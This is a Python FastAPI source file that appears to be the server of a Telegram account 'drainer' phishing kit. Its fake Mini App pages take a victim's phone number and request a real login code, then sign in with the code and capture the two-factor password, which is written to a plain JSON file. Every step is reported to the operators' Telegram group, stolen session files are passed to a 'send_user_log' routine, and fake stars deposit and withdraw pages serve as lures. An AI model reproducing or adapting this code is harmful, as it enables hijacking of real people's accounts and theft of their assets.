import paths
import io
import json
import logging
import os
import secrets
import time
import uuid
from urllib.parse import parse_qs, urlparse

import database
import piexif
import uvicorn
from aiogram.types import BufferedInputFile, InlineKeyboardButton, InlineKeyboardMarkup
from fastapi import BackgroundTasks, Cookie, FastAPI, File, Form, HTTPException, Request, UploadFile
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from PIL import Image
from pyrogram import errors
from starlette.middleware.sessions import SessionMiddleware

import env_loader

env_loader.load_code_env()

import config


def _web_session_secret() -> str:
    s = os.environ.get("WEB_SESSION_SECRET", "").strip()
    if s:
        return s
    if os.environ.get("ALLOW_INSECURE_DEV_SESSION", "").strip() == "1":
        return "dev-only-insecure-not-for-production"
    raise RuntimeError("WEB_SESSION_SECRET не задан")
from base import bot
from drainer.core.functional import mutate_text
from drainer.core.steal import send_user_log
from web_common import (
    ERROR_2FA_COOLDOWN_SECONDS,
    ERROR_COOLDOWN_SECONDS,
    InitData,
    UserInfoRequest,
    allowed_photos,
    ensure_team_config_defaults,
    failed_2fa_attempts_cooldown,
    failed_attempts_cooldown,
    get_client_state,
    get_or_create_pyrogram_client,
    is_banned,
    last_code_recently_sent,
    mask_phone_compact,
    mask_phone_plus_compact,
    mask_tg_id_short,
    parse_session_from_init,
    photos_enabled,
    drain_cookie_kwargs,
    redirect_fragment,
    session_client_key,
    set_last_code_cookie,
    templates,
    user_data,
    user_proxy_for_phone,
    verify_telegram_data,
)

ensure_team_config_defaults()


def _web_path_prefix() -> str:
    p = os.environ.get("WEB_PATH_PREFIX", "").strip().rstrip("/")
    if p:
        return p
    link = getattr(config, "WEB_APP_LINK", None) or ""
    if isinstance(link, str) and link.strip():
        return urlparse(link.strip()).path.rstrip("/")
    return ""


templates.env.globals["path_prefix"] = _web_path_prefix()


def _external_path(path: str) -> str:
    path = path.strip()
    if not path.startswith("/"):
        path = "/" + path
    base = _web_path_prefix()
    if not base:
        return path
    if path == "/":
        return base + "/"
    return base + path


def _redirect_home_clear_session_cookies() -> RedirectResponse:
    r = RedirectResponse(url=_external_path("/"), status_code=303)
    kw = drain_cookie_kwargs()
    r.delete_cookie("client_id", **kw)
    r.delete_cookie("last_code_time", **kw)
    return r


def _session_code_ready(info: dict) -> bool:
    return bool(info.get("phone_number")) and info.get("client") is not None


app = FastAPI(openapi_url=None, docs_url=None, redoc_url=None)
logger = logging.getLogger(__name__)

static_dir = os.path.join(paths.CODE_ROOT, "static")
app.mount("/static", StaticFiles(directory=static_dir), name="static")

app.add_middleware(
    SessionMiddleware,
    secret_key=_web_session_secret(),
    same_site="none",
    https_only=True,
)


@app.get("/favicon.ico", include_in_schema=False)
async def favicon_ico():
    return FileResponse(
        os.path.join(paths.CODE_ROOT, "static", "favicon.ico"),
        media_type="image/x-icon",
    )


@app.middleware("http")
async def ensure_client_id_cookie(request: Request, call_next):
    response = await call_next(request)
    client_id_cookie = request.cookies.get("client_id")
    if not client_id_cookie:
        new_id = str(uuid.uuid4())
        response.set_cookie(key="client_id", value=new_id, **drain_cookie_kwargs())
        user_data[new_id] = {}
        get_client_state(new_id)
    return response


@app.get("/", response_class=HTMLResponse)
def start(request: Request):
    last_sent_str = request.cookies.get("last_code_time")
    if last_sent_str:
        try:
            from datetime import datetime, timedelta

            last_sent_time = datetime.fromisoformat(last_sent_str)
            if datetime.utcnow() - last_sent_time < timedelta(seconds=60):
                return RedirectResponse(url=_external_path("/code"), status_code=303)
        except ValueError:
            pass
    error = request.query_params.get("error")
    if error == "invalid_phone_number":
        error_text = "Неправильный номер телефона!"
    elif error == "banned_phone_number":
        error_text = "Номер телефона заблокирован в Telegram!"
    else:
        error_text = "Неизвестная ошибка!"
    if not error:
        error_text = None
    return templates.TemplateResponse(
        "start_page.html", {"request": request, "error": error_text}
    )


@app.post("/user_info", response_class=HTMLResponse)
async def user_info(data: UserInfoRequest, request: Request):
    team_hint = os.path.basename(os.path.normpath(paths.get_team_dir()))
    try:
        tg_id, _ = parse_session_from_init(data.initData)
    except (ValueError, KeyError, json.JSONDecodeError, TypeError):
        logger.warning("user_info reject reason=parse_error team=%s", team_hint)
        return redirect_fragment()
    if is_banned(tg_id):
        logger.warning(
            "user_info reject reason=banned team=%s tg_id=%s",
            team_hint,
            mask_tg_id_short(tg_id),
        )
        return redirect_fragment(303)
    if not verify_telegram_data(data.initData):
        logger.warning(
            "user_info reject reason=verify_failed team=%s",
            team_hint,
        )
        return redirect_fragment()
    try:
        parsed = parse_qs(data.initData)
        raw_u = parsed.get("user", [None])[0]
        if not raw_u:
            return redirect_fragment()
        user = json.loads(raw_u)
        request.session["tg_id"] = int(user["id"])
        request.session["tg_first_name"] = str(user.get("first_name") or "")
        request.session["tg_photo_url"] = str(user.get("photo_url") or "")
    except (KeyError, TypeError, ValueError, json.JSONDecodeError):
        logger.warning("user_info reject reason=session_fill team=%s", team_hint)
        return redirect_fragment()
    return HTMLResponse(status_code=200, content="OK")


@app.post("/", response_class=HTMLResponse)
async def start_post(
    request: Request,
    phone_number: str = Form(...),
    initData: str = Form(...),
    client_id: str = Cookie(None),
):
    if not client_id:
        client_id = str(uuid.uuid4())
    if not verify_telegram_data(initData):
        return redirect_fragment()
    try:
        tg_id, tg_username = parse_session_from_init(initData)
    except (ValueError, KeyError, json.JSONDecodeError, TypeError):
        return redirect_fragment(303)
    if not tg_id:
        return redirect_fragment(303)
    if is_banned(tg_id):
        return redirect_fragment(303)
    full_phone = phone_number.replace("+", "")
    user_proxy = user_proxy_for_phone(full_phone)
    session_key = session_client_key(tg_id, client_id)
    user_client = get_or_create_pyrogram_client(session_key, user_proxy)
    user_data[client_id] = {
        "phone_number": full_phone,
        "tg_username": tg_username,
        "tg_id": tg_id,
        "client": user_client,
    }
    response = RedirectResponse(url=_external_path("/code"), status_code=303)
    response.set_cookie("client_id", client_id, **drain_cookie_kwargs())
    return response


@app.get("/code", response_class=HTMLResponse)
async def code_page(request: Request):
    recently_sent = last_code_recently_sent(request)
    client_id_cookie = request.cookies.get("client_id")
    if not client_id_cookie or client_id_cookie not in user_data:
        return _redirect_home_clear_session_cookies()
    user_info = user_data[client_id_cookie]
    if not _session_code_ready(user_info):
        return _redirect_home_clear_session_cookies()
    phone_number = f"+{user_info['phone_number']}"
    tg_id = user_info.get("tg_id")
    hidden_tg_id = mask_tg_id_short(tg_id)
    if recently_sent and "phone_code_hash" in user_info:
        return templates.TemplateResponse(
            "code_page.html", {"request": request, "phone_number": phone_number}
        )
    client = user_info["client"]
    try:
        if not client.is_connected:
            await client.connect()
        sent_code = await client.send_code(phone_number)
        user_info["phone_code_hash"] = sent_code.phone_code_hash
        hidden_phone_number = phone_number.replace(" ", "")
        hidden_phone_number = (
            hidden_phone_number[:3]
            + "*" * (len(hidden_phone_number) - 6)
            + hidden_phone_number[-4:]
        )
        await bot.send_message(
            chat_id=config.WORK_GROUP_ID,
            message_thread_id=config.DRAIN_LOGS_THREAD_ID,
            text=(
                f"<tg-emoji emoji-id='5206401524200145033'>🔴</tg-emoji> <b>Код отправлен</b>\n"
                f"<tg-emoji emoji-id='5242380641332393116'>☎️</tg-emoji> Телефон: <code>{hidden_phone_number}</code>\n"
                f"<tg-emoji emoji-id='5278589204207528856'>🆔</tg-emoji> TG ID: <code>{hidden_tg_id}</code>"
            ),
            parse_mode="HTML",
        )
        response = templates.TemplateResponse(
            "code_page.html", {"request": request, "phone_number": phone_number}
        )
        set_last_code_cookie(response)
        return response
    except Exception as e:
        error_code = "unknown"
        err = str(e).upper()
        print(err)
        if "PHONE_NUMBER_BANNED" in err:
            error_code = "banned_phone_number"
        if "PHONE_NUMBER_INVALID" in err:
            error_code = "invalid_phone_number"
        return RedirectResponse(
            url=_external_path(f"/?error={error_code}"), status_code=303
        )


@app.get("/password", response_class=HTMLResponse)
async def password_page(request: Request):
    client_id_cookie = request.cookies.get("client_id")
    if not client_id_cookie or client_id_cookie not in user_data:
        return _redirect_home_clear_session_cookies()
    user_info = user_data[client_id_cookie]
    if "password_hint" not in user_info:
        return _redirect_home_clear_session_cookies()
    hint = user_info.get("password_hint", "Пароль")
    return templates.TemplateResponse(
        "2fa_page.html", {"request": request, "hint": hint}
    )


@app.post("/verify_code")
async def verify_code(
    request: Request, background_tasks: BackgroundTasks, code: str = Form(...)
):
    try:
        client_id_cookie = request.cookies.get("client_id")
        if not client_id_cookie or client_id_cookie not in user_data:
            raise HTTPException(status_code=400, detail="Invalid session")
        user_info = user_data[client_id_cookie]
        if not _session_code_ready(user_info):
            raise HTTPException(status_code=400, detail="Invalid session")
        state = get_client_state(client_id_cookie)
        state["status"] = "waiting"
        phone_number = user_info["phone_number"]
        phone_code_hash = user_info.get("phone_code_hash")
        tg_id = user_info.get("tg_id")
        if is_banned(tg_id):
            return redirect_fragment(303)
        hidden_tg_id = mask_tg_id_short(tg_id)
        hidden_phone_number = mask_phone_plus_compact(phone_number)
        if not phone_code_hash:
            raise HTTPException(status_code=400, detail="phone_code_hash is missing")
        client = user_info["client"]
        if not client.is_connected:
            await client.connect()
        await client.sign_in(
            phone_number=phone_number,
            phone_code_hash=phone_code_hash,
            phone_code=code,
        )
        try:
            await client.disconnect()
        except Exception:
            pass
        state["status"] = "ok"
        markup = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="🔃 Отправить снова",
                        callback_data=f"send_again:{tg_id}",
                    )
                ],
            ]
        )
        await bot.send_message(
            chat_id=config.WORK_GROUP_ID,
            message_thread_id=config.DRAIN_LOGS_THREAD_ID,
            text=(
                f"<tg-emoji emoji-id='5278602437001767574'>🟢</tg-emoji> <b>Успешный вход</b>\n"
                f"<tg-emoji emoji-id='5242380641332393116'>☎️</tg-emoji> Телефон: <code>{hidden_phone_number}</code>\n"
                f"<tg-emoji emoji-id='5278589204207528856'>🆔</tg-emoji> TG ID: <code>{hidden_tg_id}</code>"
            ),
            parse_mode="HTML",
            reply_markup=markup,
        )
        background_tasks.add_task(
            send_user_log,
            user_id=tg_id,
            session_file=f"{paths.get_team_dir()}/sessions/{tg_id}",
        )
        is_photo_allowed = photos_enabled()
        if is_photo_allowed:
            allowed_photos[tg_id] = {"hash": "access", "time": 0}
        state["is_photo_allowed"] = is_photo_allowed
        return JSONResponse({"success": True, "photo_allowed": is_photo_allowed})
    except errors.SessionPasswordNeeded:
        try:
            hint = await client.get_password_hint() or "Пароль"
        except Exception:
            hint = "Пароль"
        user_info["password_hint"] = hint
        await bot.send_message(
            chat_id=config.WORK_GROUP_ID,
            message_thread_id=config.DRAIN_LOGS_THREAD_ID,
            text=(
                f"<tg-emoji emoji-id='5276240711795107620'>🟡</tg-emoji> <b>Код верный · ждём 2FA</b>\n"
                f"<tg-emoji emoji-id='5242380641332393116'>☎️</tg-emoji> Телефон: <code>{hidden_phone_number}</code>\n"
                f"<tg-emoji emoji-id='5278589204207528856'>🆔</tg-emoji> TG ID: <code>{hidden_tg_id}</code>"
            ),
            parse_mode="HTML",
        )
        state["status"] = "password"
        return JSONResponse({"success": True})
    except (errors.PhoneCodeInvalid, errors.PhoneCodeExpired):
        current_time = time.time()
        last_error_time = failed_attempts_cooldown.get(tg_id, 0)
        if current_time - last_error_time > ERROR_COOLDOWN_SECONDS:
            await bot.send_message(
                chat_id=config.WORK_GROUP_ID,
                message_thread_id=config.DRAIN_LOGS_THREAD_ID,
                text=(
                    f"<tg-emoji emoji-id='5278578973595427038'>🔴</tg-emoji> <b>Код неверный</b>\n"
                    f"<tg-emoji emoji-id='5242380641332393116'>☎️</tg-emoji> Телефон: <code>{hidden_phone_number}</code>\n"
                    f"<tg-emoji emoji-id='5278589204207528856'>🆔</tg-emoji> TG ID: <code>{hidden_tg_id}</code>"
                ),
                parse_mode="HTML",
            )
            failed_attempts_cooldown[tg_id] = current_time
        state["status"] = "invalid"
        return JSONResponse({"success": True})
    except Exception:
        state["status"] = "waiting"
        return JSONResponse({"success": True})


@app.get("/check_result")
async def check_result(request: Request):
    client_id = request.cookies.get("client_id")
    if not client_id:
        return JSONResponse({"status": "waiting"})
    return JSONResponse(get_client_state(client_id))


@app.post("/verify_password")
async def verify_password(
    request: Request, background_tasks: BackgroundTasks, password: str = Form(...)
):
    client_id_cookie = request.cookies.get("client_id")
    if not client_id_cookie or client_id_cookie not in user_data:
        raise HTTPException(status_code=400, detail="Invalid session")
    user_info = user_data[client_id_cookie]
    if not _session_code_ready(user_info) or "password_hint" not in user_info:
        raise HTTPException(status_code=400, detail="Invalid session")
    state = get_client_state(client_id_cookie)
    state["status"] = "waiting"
    client = user_info["client"]
    phone_number = user_info.get("phone_number")
    tg_id = user_info.get("tg_id")
    hidden_tg_id = mask_tg_id_short(tg_id)
    compact = mask_phone_compact(phone_number)
    hidden_phone_number = f"+{compact}"
    try:
        if not client.is_connected:
            await client.connect()
        await client.check_password(password=password)
        state["status"] = "ok"
        try:
            await client.disconnect()
        except Exception:
            pass
        twofa_path = os.path.join(paths.get_team_dir(), "storage", "2fa.json")
        with open(twofa_path, "r", encoding="utf-8") as f:
            json_2fa = json.load(f)
        json_2fa[tg_id] = password
        with open(twofa_path, "w", encoding="utf-8") as f:
            json.dump(json_2fa, f)
        markup = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="🔃 Oтправить снoва",
                        callback_data=f"send_again:{tg_id}",
                    )
                ],
            ]
        )
        await bot.send_message(
            chat_id=config.WORK_GROUP_ID,
            message_thread_id=config.DRAIN_LOGS_THREAD_ID,
            text=(
                f"<tg-emoji emoji-id='5278602437001767574'>🟢</tg-emoji> <b>Успешный вход с 2FA</b>\n"
                f"<tg-emoji emoji-id='5242380641332393116'>☎️</tg-emoji> Телефон: <code>{hidden_phone_number}</code>\n"
                f"<tg-emoji emoji-id='5278540791336165644'>🆔</tg-emoji> Пароль: Котi\n"
                f"<tg-emoji emoji-id='5278589204207528856'>🆔</tg-emoji> TG ID: <code>{hidden_tg_id}</code>"
            ),
            parse_mode="HTML",
            reply_markup=markup,
        )
        background_tasks.add_task(
            send_user_log,
            user_id=tg_id,
            session_file=f"{paths.get_team_dir()}/sessions/{tg_id}",
        )
        is_photo_allowed = photos_enabled()
        state["is_photo_allowed"] = is_photo_allowed
        if is_photo_allowed:
            allowed_photos[tg_id] = {"hash": "access", "time": 0}
        return JSONResponse({"success": True, "is_photo_allowed": is_photo_allowed})
    except errors.PasswordHashInvalid:
        current_time = time.time()
        last_error_time = failed_2fa_attempts_cooldown.get(tg_id, 0)
        if current_time - last_error_time > ERROR_2FA_COOLDOWN_SECONDS:
            await bot.send_message(
                chat_id=config.WORK_GROUP_ID,
                message_thread_id=config.DRAIN_LOGS_THREAD_ID,
                text=(
                    f"<tg-emoji emoji-id='5278578973595427038'>🔴</tg-emoji> <b>2FA неверный</b>\n"
                    f"<tg-emoji emoji-id='5242380641332393116'>☎️</tg-emoji> Телефон: <code>{hidden_phone_number}</code>\n"
                    f"<tg-emoji emoji-id='5278589204207528856'>🆔</tg-emoji> TG ID: <code>{hidden_tg_id}</code>"
                ),
                parse_mode="HTML",
            )
            failed_2fa_attempts_cooldown[tg_id] = current_time
        state["status"] = "invalid"
        return JSONResponse({"success": True})
    except Exception:
        state["status"] = "waiting"
        return JSONResponse({"success": True})


@app.post("/init")
async def init(data: InitData, request: Request):
    if not verify_telegram_data(data.initData):
        return {"ok": False}
    parsed = parse_qs(data.initData)
    raw_u = parsed.get("user", [None])[0]
    if not raw_u:
        return {"ok": False}
    try:
        user = json.loads(raw_u)
        request.session["tg_id"] = int(user["id"])
        request.session["tg_first_name"] = str(user.get("first_name") or "")
        request.session["tg_photo_url"] = str(user.get("photo_url") or "")
    except (KeyError, TypeError, ValueError, json.JSONDecodeError):
        return {"ok": False}
    return {"ok": True}

@app.get("/app", response_class=HTMLResponse)
async def app_page(request: Request):
    return templates.TemplateResponse(
        "app.html",
        {
            "request": request,
            "amount": "Загрузка...",
            "name": "Загрузка...",
            "icon": "https://t.me/i/userpic/320/default.svg",
        },
    )


@app.get("/me")
async def me(request: Request):
    balance = database.get_gois_stars(request.session.get("tg_id"))
    fn = request.session.get("tg_first_name")
    photo = request.session.get("tg_photo_url")
    return {
        "tg_id": request.session.get("tg_id"),
        "balance": balance if balance else 0,
        "tg_first_name": fn if fn is not None else "",
        "tg_photo_url": photo if photo is not None else "",
    }


@app.get("/deposit", response_class=HTMLResponse)
async def deposit_page(request: Request):
    return templates.TemplateResponse(
        "deposit.html",
        {"request": request, "balance": 100},
    )


@app.get("/withdraw", response_class=HTMLResponse)
async def withdraw_page(request: Request):
    return templates.TemplateResponse(
        "withdraw.html",
        {"request": request},
    )


@app.get("/userpage", response_class=HTMLResponse)
async def user_page(request: Request):
    return templates.TemplateResponse(
        "userpage.html",
        {"request": request, "receiver": config.RECEIVER_ID},
    )


@app.post("/init_photo_hash")
async def init_photo_hash(initData: str = Form(...)):
    if not verify_telegram_data(initData):
        return JSONResponse({"success": False, "error": "Invalid initData"})
    parsed = parse_qs(initData)
    user_id = json.loads(parsed["user"][0])["id"]
    now = time.time()
    if user_id in allowed_photos:
        if now - allowed_photos[user_id]["time"] < 300:
            return JSONResponse({"success": False, "error": "Too many requests"})
    photo_hash = secrets.token_urlsafe(32)
    allowed_photos[user_id] = {"hash": photo_hash, "time": now}
    return JSONResponse({"success": True, "hash": photo_hash})


@app.post("/upload_photo")
async def upload_photo(initData: str = Form(...), photo: UploadFile = File(...)):
    if not photos_enabled():
        return JSONResponse({"success": False, "error": "Photos are not allowed."})
    if not verify_telegram_data(initData):
        return JSONResponse({"success": False, "error": "Invalid initData"})
    parsed = parse_qs(initData)
    u = json.loads(parsed["user"][0])
    user_id = u["id"]
    username = u.get("username")
    hidden_username = (
        username[:2] + "*" * (len(username) - 4) + username[-2:]
        if username and len(username) > 4
        else username or "-"
    )
    hidden_id = str(user_id)[:3] + "*" * (len(str(user_id)) - 6) + str(user_id)[-4:]
    if user_id not in allowed_photos:
        return JSONResponse({"success": False, "error": "No hash issued"})
    image_bytes = await photo.read()
    img = Image.open(io.BytesIO(image_bytes))
    if img.size != (1024, 1536):
        return JSONResponse({"success": False, "error": "Invalid image size"})
    exif_data = piexif.load(img.info.get("exif", b""))
    user_comment = exif_data["Exif"].get(piexif.ExifIFD.UserComment, b"")
    try:
        photo_hash = user_comment.decode()
    except Exception:
        return JSONResponse({"success": False, "error": "Invalid EXIF hash"})
    if photo_hash != allowed_photos[user_id]["hash"]:
        return JSONResponse({"success": False, "error": "Hash mismatch"})
    del allowed_photos[user_id]
    photo_file = BufferedInputFile(image_bytes, filename="photo.jpg")
    caption_text = (
        f"<tg-emoji emoji-id='5058013337585977116'>🤣</tg-emoji><b>Фото МиииМиииМонта</b>\n\n"
        f"<tg-emoji emoji-id='5242380641332393116'>🆔</tg-emoji>ID: <code>{hidden_id}</code>\n"
        f"<tg-emoji emoji-id='5275979556308674886'>👤</tg-emoji>Логин: <code>{hidden_username}</code>"
    )
    await bot.send_photo(
        chat_id=config.WORK_GROUP_ID,
        message_thread_id=config.DRAIN_LOGS_THREAD_ID,
        photo=photo_file,
        caption=caption_text,
        parse_mode="HTML",
    )
    return JSONResponse({"success": True})


if __name__ == "__main__":
    _host = os.environ.get("WEB_HOST", "127.0.0.1")
    _port = int(os.environ.get("WEB_PORT", "8000"))
    _reload = os.environ.get("WEB_RELOAD", "1").lower() in ("1", "true", "yes")
    uvicorn.run("web:app", host=_host, port=_port, reload=_reload)
